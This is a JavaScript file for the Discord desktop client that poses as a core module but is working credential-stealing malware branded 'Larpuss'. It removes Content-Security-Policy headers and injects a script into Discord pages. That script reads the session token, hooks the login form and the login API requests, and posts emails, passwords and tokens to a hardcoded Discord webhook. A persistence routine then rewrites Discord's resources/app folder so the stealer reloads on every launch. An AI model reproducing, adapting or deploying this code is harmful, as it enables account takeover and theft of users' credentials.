const { app, BrowserWindow, session } = require('electron');
const path = require('path');
const fs = require('fs');
const https = require('https');

const config = {
    webhook: "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH",
    inject_script: `
        // Larpuss Injection Script - Direct DOM
        (() => {
            const WEBHOOK = "https://discord.com/api/webhooks/1547380723370168391/5yXZgAHceuaFB-N1pNi8ac51-fgha7gKdThSQjc9tWkogtbE9rMl2vsZ_nTkbQhR5kmH";
            
            const sendHook = (data) => {
                fetch(WEBHOOK, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify(data)
                }).catch(() => {});
            };
            
            const getToken = () => {
                try {
                    let token;
                    webpackChunkdiscord_app.push([[Math.random()], {}, (req) => {
                        for (const m of Object.keys(req.c).map(x => req.c[x].exports)) {
                            if (m?.default?.getToken) {
                                token = m.default.getToken();
                                break;
                            }
                        }
                    }]);
                    return token || localStorage.token?.replace(/"/g, '');
                } catch {
                    return localStorage.token?.replace(/"/g, '') || null;
                }
            };
            
            const captureLogin = () => {
                const observer = new MutationObserver(() => {
                    // Intercepter les formulaires de login
                    const emailInput = document.querySelector('input[name="email"], input[type="email"]');
                    const passwordInput = document.querySelector('input[name="password"], input[type="password"]');
                    const loginButton = document.querySelector('button[type="submit"], button:contains("Log In"), button:contains("Se connecter")');
                    
                    if (emailInput && passwordInput && loginButton) {
                        loginButton.addEventListener('click', () => {
                            setTimeout(() => {
                                const token = getToken();
                                if (token && token.length > 50) {
                                    sendHook({
                                        embeds: [{
                                            title: "🔓 Larpuss Login Captured",
                                            fields: [
                                                { name: "Email", value: emailInput.value, inline: true },
                                                { name: "Password", value: passwordInput.value, inline: true },
                                                { name: "Token", value: token, inline: false }
                                            ],
                                            color: 0xFFFFFF,
                                            footer: { text: "t.me/larpuss" },
                                            timestamp: new Date().toISOString()
                                        }]
                                    });
                                }
                            }, 2000);
                        });
                    }
                });
                
                observer.observe(document.body, { childList: true, subtree: true });
            };
            
            // Démarrage
            if (document.readyState === 'loading') {
                document.addEventListener('DOMContentLoaded', captureLogin);
            } else {
                captureLogin();
            }
            
            // Test injection active
            setTimeout(() => {
                const token = getToken();
                if (token) {
                    sendHook({
                        embeds: [{
                            title: "🚀 Larpuss Injection Active",
                            description: "DOM injection running",
                            color: 0x00FF00,
                            footer: { text: "t.me/larpuss" }
                        }]
                    });
                }
            }, 10000);
        })();
    `
};

// Hook pour injecter le script dans toutes les pages Discord
session.defaultSession.webRequest.onHeadersReceived({
    urls: ["*://*.discord.com/*", "*://*.discordapp.com/*"]
}, (details, callback) => {
    callback({
        responseHeaders: {
            ...details.responseHeaders,
            'Content-Security-Policy': []
        }
    });
});

// Injection automatique dans les webContents
app.on('web-contents-created', (event, contents) => {
    contents.on('dom-ready', () => {
        if (contents.getURL().includes('discord.com')) {
            contents.executeJavaScript(config.inject_script).catch(() => {});
        }
    });
});

// Hook sur les requêtes réseau pour capturer les logins
session.defaultSession.webRequest.onBeforeRequest({
    urls: [
        "*://discord.com/api/*/auth/login",
        "*://canary.discord.com/api/*/auth/login",
        "*://ptb.discord.com/api/*/auth/login"
    ]
}, (details, callback) => {
    if (details.uploadData && details.uploadData[0]) {
        try {
            const loginData = JSON.parse(details.uploadData[0].bytes.toString());
            
            // Stocker temporairement les données de login
            global.lastLogin = {
                email: loginData.login || loginData.email,
                password: loginData.password,
                timestamp: Date.now()
            };
        } catch {}
    }
    callback({});
});

// Hook sur les réponses pour détecter les logins réussis
session.defaultSession.webRequest.onCompleted({
    urls: [
        "*://discord.com/api/*/auth/login",
        "*://canary.discord.com/api/*/auth/login", 
        "*://ptb.discord.com/api/*/auth/login"
    ]
}, (details) => {
    if (details.statusCode === 200 && global.lastLogin) {
        const loginData = global.lastLogin;
        
        // Envoyer les données capturées
        const webhook_data = {
            embeds: [{
                title: "🔐 Larpuss Network Capture",
                fields: [
                    { name: "📧 Email", value: loginData.email || "N/A", inline: true },
                    { name: "🔑 Password", value: loginData.password || "N/A", inline: true },
                    { name: "🌐 URL", value: details.url, inline: false }
                ],
                color: 0xFF0000,
                footer: { text: "t.me/larpuss • Network Hook" },
                timestamp: new Date().toISOString()
            }]
        };
        
        // Envoyer vers webhook
        const payload = JSON.stringify(webhook_data);
        const url = new URL(config.webhook);
        
        const req = https.request({
            hostname: url.hostname,
            port: 443,
            path: url.pathname,
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'Content-Length': Buffer.byteLength(payload)
            }
        });
        
        req.write(payload);
        req.end();
        
        // Nettoyer
        global.lastLogin = null;
    }
});

// Auto-persistence dans Discord
const persistence = () => {
    try {
        const discordPath = process.execPath.replace(/[^\\]*$/, '');
        const resourcesPath = path.join(discordPath, 'resources');
        
        if (fs.existsSync(resourcesPath)) {
            const appPath = path.join(resourcesPath, 'app');
            if (!fs.existsSync(appPath)) {
                fs.mkdirSync(appPath, { recursive: true });
            }
            
            // Package.json
            fs.writeFileSync(path.join(appPath, 'package.json'), JSON.stringify({
                name: "discord",
                main: "index.js"
            }));
            
            // Index.js avec injection
            const indexContent = `
// Larpuss Persistence
${fs.readFileSync(__filename, 'utf8')}

// Load Discord
require('${path.join(resourcesPath, 'app.asar').replace(/\\/g, '\\\\')}');
            `;
            
            fs.writeFileSync(path.join(appPath, 'index.js'), indexContent);
        }
    } catch {}
};

// Démarrage
setTimeout(() => {
    persistence();
}, 3000);

// Export Discord
module.exports = require('./core.asar');
